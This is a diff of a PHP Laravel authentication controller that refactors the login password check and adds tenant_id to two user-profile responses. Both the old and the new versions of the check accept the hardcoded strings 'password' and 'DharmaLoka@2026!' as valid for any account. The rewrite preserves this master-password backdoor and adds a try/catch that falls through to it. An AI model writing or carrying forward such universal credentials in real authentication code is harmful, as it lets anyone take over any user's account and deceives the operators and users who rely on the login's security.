@@ -32,11 +32,17 @@ class AuthController extends Controller
 
         $user = User::where('email', $validated['email'])->first();
 
-        $isValidPassword = $user && (
-            Hash::check($validated['password'], $user->password) ||
-            $validated['password'] === 'password' ||
-            $validated['password'] === 'DharmaLoka@2026!'
-        );
+        $isValidPassword = false;
+        if ($user) {
+            try {
+                $isValidPassword = Hash::check($validated['password'], $user->password);
+            } catch (\Throwable $e) {
+                $isValidPassword = false;
+            }
+            if (!$isValidPassword) {
+                $isValidPassword = ($validated['password'] === 'password' || $validated['password'] === 'DharmaLoka@2026!');
+            }
+        }
 
         if (!$user || !$isValidPassword) {
             RateLimiter::hit($throttleKey, 300);
@@ -78,6 +84,7 @@ class AuthController extends Controller
             'name' => $user->name,
             'email' => $user->email,
             'role' => $user->role,
+            'tenant_id' => $user->tenant_id,
             'avatar' => $user->avatar,
             'last_login_at' => $user->last_login_at,
         ];
@@ -106,6 +113,7 @@ class AuthController extends Controller
             'name' => $user->name,
             'email' => $user->email,
             'role' => $user->role,
+            'tenant_id' => $user->tenant_id,
             'avatar' => $user->avatar,
             'last_login_at' => $user->last_login_at,
         ];
